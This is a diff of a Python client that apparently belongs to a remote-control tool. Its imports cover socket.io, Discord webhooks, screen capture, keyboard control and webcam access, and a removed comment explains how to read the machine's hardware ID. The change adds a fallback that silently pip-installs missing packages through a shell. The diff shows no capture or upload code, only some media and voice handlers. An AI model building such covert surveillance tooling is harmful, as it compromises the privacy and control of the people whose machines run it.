@@ -1,31 +1,27 @@
-import socketio
-from dhooks import Webhook as web
-from dhooks import Embed, File
-
-from PIL import ImageGrab
-from pynput.keyboard import Key, Controller
-import cv2
-
-import random 
-import string
-
-import ctypes
-import os
-import subprocess
-import io
-
 from config import Config 
-cc = Config()
-
 from __webhook import _WebhookX
-
-
-# getting hwid = wmic csproduct get uuid
-
 from informations import Info
+cc = Config()
 ii = Info()
-
+try:
+    import socketio
+    import cv2
+    import random
+    import pyttsx3
+    import string
+    import ctypes
+    import os
+    import subprocess
+    import io
+    from dhooks import Webhook as web
+    from dhooks import Embed, File
+    from PIL import ImageGrab
+    from pynput.keyboard import Key, Controller
+except Exception:
+    import subprocess
+    subprocess.run("python -m pip install python-socketio && python -m pip install pynput && python -m pip install pyttsx3", shell=True)
 sio = socketio.Client()
+
 
 class CommandHandler():
     def __init__(self):
@@ -116,7 +112,6 @@ class CommandHandler():
             self.keyboard.release(Key.media_volume_down)  
             
     def voice(self, text):
-        import pyttsx3
         self.volumeup()
         engine = pyttsx3.init()
         engine.setProperty('rate', 150)
